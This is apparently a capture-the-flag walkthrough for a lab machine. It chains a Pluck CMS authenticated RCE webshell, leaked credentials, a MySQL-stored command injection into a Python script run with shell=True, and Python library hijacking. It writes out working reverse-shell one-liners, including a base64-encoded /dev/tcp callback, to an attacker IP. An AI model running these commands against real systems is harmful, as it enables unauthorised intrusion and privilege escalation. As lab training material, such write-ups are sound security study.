# Foothold

# 80

80 shows apache default page
apache 2.4.41

Checking for files and dirs on the webserver with gobuster:
```
sudo gobuster dir -u http://10.10.223.148 -w /opt/wordlists/directory-list-2.3-medium.txt -o gobusterLogs -x php,txt,html,pdf,sql,old,bak
```

This shows an /app/ folder. In this folder, there is another folder called: pluck 4.17.13
Clicking on this will open pluck. Checking the version, exploitdb has a RCE for us:
```
https://www.exploit-db.com/exploits/49909
```

We need to be authenticated to use this tho. THerefore, I look for a login page and clicking on 'admin' in the bottom of the page redirects us to a login form for the user admin. Checking some easy to guess password gives us access. (the password is 'password'). Now we can use the RCE from exploitdb:

We need to provide some arguments for the python script:
```
User Input:
'''
target_ip = sys.argv[1]
target_port = sys.argv[2]
password = sys.argv[3]
pluckcmspath = sys.argv[4]
```

The final command looks like this:
```
python3 exploit.py 10.10.223.148 80 password /app/pluck-4.7.13/
```

```
Authentification was succesfull, uploading webshell

Uploaded Webshell to: http://10.10.223.148:80/app/pluck-4.7.13//files/shell.phar

```



# 22

connecting to ssh show us this custom message:
```
                                  {} {}
                            !  !  II II  !  !
                         !  I__I__II II__I__I  !
                         I_/|--|--|| ||--|--|\_I
        .-'"'-.       ! /|_/|  |  || ||  |  |\_|\ !       .-'"'-.
       /===    \      I//|  |  |  || ||  |  |  |\\I      /===    \
       \==     /   ! /|/ |  |  |  || ||  |  |  | \|\ !   \==     /
        \__  _/    I//|  |  |  |  || ||  |  |  |  |\\I    \__  _/
         _} {_  ! /|/ |  |  |  |  || ||  |  |  |  | \|\ !  _} {_
        {_____} I//|  |  |  |  |  || ||  |  |  |  |  |\\I {_____}
   !  !  |=  |=/|/ |  |  |  |  |  || ||  |  |  |  |  | \|\=|-  |  !  !
  _I__I__|=  ||/|  |  |  |  |  |  || ||  |  |  |  |  |  |\||   |__I__I_
  -|--|--|-  || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||=  |--|--|-
  _|__|__|   ||_|__|__|__|__|__|__|| ||__|__|__|__|__|__|_||-  |__|__|_
  -|--|--|   ||-|--|--|--|--|--|--|| ||--|--|--|--|--|--|-||   |--|--|-
   |  |  |=  || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||   |  |  |
   |  |  |   || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||=  |  |  |
   |  |  |-  || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||   |  |  |
   |  |  |   || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||=  |  |  |
   |  |  |=  || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||   |  |  |
   |  |  |   || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||   |  |  |
   |  |  |   || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||-  |  |  |
  _|__|__|   || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||=  |__|__|_
  -|--|--|=  || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||   |--|--|-
  _|__|__|   ||_|__|__|__|__|__|__|| ||__|__|__|__|__|__|_||-  |__|__|_
  -|--|--|=  ||-|--|--|--|--|--|--|| ||--|--|--|--|--|--|-||=  |--|--|-
  jgs |  |-  || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||-  |  |  |
 ~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^~~~~~~~~~~~

W e l c o m e, s t r a n g e r . . .

```


# User 1

Using whoami shows that we're currently the www-data user.

I prefer reverse shells over webshells, so let's get one going:
```
open listener:
sudo nc -lvnp 9001

use this on the target:
export RHOST="10.11.72.104";export RPORT=9001;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```

To help enumerating the system, I move linpeas onto the target:

```
#move into the folder where linpeas is
#open a server with:
python3 -m http.server 80

#now on the target, get linpeas:
wget <attackbox ip>/linpeas.sh
chmod +x linpeas.sh && ./linpeas.sh
```

Linpeas notes:

system listens to mysql ports from localhost

interesting files that we can execute:
/home/death/getDreams.py
/opt/test.py

unexpected folder in root:
/kingdom_backup


# opt files

## getDreams.py

```
getDreams.py

import mysql.connector
import subprocess

# MySQL credentials
DB_USER = "death"
DB_PASS = "#redacted"
DB_NAME = "library"

import mysql.connector
import subprocess

def getDreams():
    try:
        # Connect to the MySQL database
        connection = mysql.connector.connect(
            host="localhost",
            user=DB_USER,
            password=DB_PASS,
            database=DB_NAME
        )

        # Create a cursor object to execute SQL queries
        cursor = connection.cursor()

        # Construct the MySQL query to fetch dreamer and dream columns from dreams table
        query = "SELECT dreamer, dream FROM dreams;"

        # Execute the query
        cursor.execute(query)

        # Fetch all the dreamer and dream information
        dreams_info = cursor.fetchall()

        if not dreams_info:
            print("No dreams found in the database.")
        else:
            # Loop through the results and echo the information using subprocess
            for dream_info in dreams_info:
                dreamer, dream = dream_info
                command = f"echo {dreamer} + {dream}"
                shell = subprocess.check_output(command, text=True, shell=True)
                print(shell)

    except mysql.connector.Error as error:
        # Handle any errors that might occur during the database connection or query execution
        print(f"Error: {error}")

    finally:
        # Close the cursor and connection
        cursor.close()
        connection.close()

# Call the function to echo the dreamer and dream information
getDreams()

```

So this script connects to the mysql db we found earlier and receives 'dreamers' and 'dreams', and prints them into the shell. the mysql user is called 'death', who is also the owner of the file. Sadly the password is redacted.

## test.py

```
cat test.py
import requests

#Todo add myself as a user
url = "http://127.0.0.1/app/pluck-4.7.13/login.php"
password = "HeyLucien#@1999!"

data = {
        "cont1":password,
        "bogus":"",
        "submit":"Log+in"
        }

req = requests.post(url,data=data)

if "Password correct." in req.text:
    print("Everything is in proper order. Status Code: " + str(req.status_code))
else:
    print("Something is wrong. Status Code: " + str(req.status_code))
    print("Results:\n" + req.text)
```

This file leaks a password. Using it with the username lucien for ssh gives us access as lucien:
```
ssh lucien@10.10.223.148 
```

This gives us the first flag in luciens home folder.
```
cat ~/lucien_flag.txt
```

## user 2

checking our groups with 
```
id -Gn
```

shows that we're part of a 'adm' group. Since we have the password of lucien, sudo -l is also worth checking out:
```
lucien@dreaming:~$ sudo -l
Matching Defaults entries for lucien on dreaming:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lucien may run the following commands on dreaming:
    (death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py

```

Let's do it:
```
sudo -u death /usr/bin/python3 /home/death/getDreams.py
```

```
Alice + Flying in the sky

Bob + Exploring ancient ruins

Carol + Becoming a successful entrepreneur

Dave + Becoming a professional musician
```

After running some more enumeration, I found something in the bash_history file of lucien:

```
mysql -u lucien -plucien42DBPASSWORD
```

This gives us access to mysql. Going back to getDreams.py, let's read version we found in /opt/ again, since this is most likely a copy of the script we can execute.

```
 command = f"echo {dreamer} + {dream}"
 shell = subprocess.check_output(command, text=True, shell=True)
```

Those 2 lines are critical. first, we construct a formatted string that takes the dreamer and dream and echoes those. Then we pass this string into the shell and execute it. Since we have access to mysql now, we can abuse this to inject shell commands.

```In mysql shell
# we know the database is called library
use library
show tables
#shows us the dreams table
#let's insert a small test into the db to check if everything works as expected
INSERT INTO dreams VALUES ('attacker', ';whoami')
```

Now we can execute the script again:
```
lucien@dreaming:~$ sudo -u death /usr/bin/python3 /home/death/getDreams.py
Alice + Flying in the sky

Bob + Exploring ancient ruins

Carol + Becoming a successful entrepreneur

Dave + Becoming a professional musician

attacker +
death

```

In the last line we can see that our command executed. Now we have several paths which we could go down. Let's add a table entry that contains a shell, to avoid any problems with escaping quotes etc, b64 encode it and decode it. Then pipe it to bash:
```
L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjExLjcyLjEwNC85MDAyIDA+JjE=|base64 -d|bash
```

So our entry in the table looks like this:
```
INSERT INTO dreams VALUES ('attacker', ';echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjExLjcyLjEwNC85MDAyIDA+JjE=|base64 -d|bash');
```

```
#listener:
sudo nc -lvnp 9002

#execute the script with sudo on the system again:
sudo -u death /usr/bin/python3 /home/death/getDreams.py

#results in a shell as death
```

Now we can grab flag #2 and head onto the last user: morpheus

# user 3

Checking the home folder of morpheus, we find a restore.py that we can read but not execute:

```
cat restore.py
from shutil import copy2 as backup

src_file = "/home/morpheus/kingdom"
dst_file = "/kingdom_backup/kingdom"

backup(src_file, dst_file)
print("The kingdom backup has been done!")

```

Because of the name, I think this file get's executed regularly. To check this, we can use pspy. Download it and execute it. Let it run for a couple of minutes.

![[Pasted image 20240213131030.png]]

WE can see that indeed restore.py is getting executed. Checking /etc/passwd shows that UID 1002 is morpheus. This is most likely the path to morpheus.

The script itself doesn't do a whole lot. The only thing I can think of here is library hijacking. So let's looks for the shutil library:

![[Pasted image 20240213131856.png]]


![[Pasted image 20240213131613.png]]

Neat, the file is writeable for users of the death group, which we belong to (use id -Gn to confirm)

Let's add a shell to the file:

```
export RHOST="10.11.72.104";export RPORT=9003;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```


This pops the last shell after waiting for a bit. Thanks for reading.
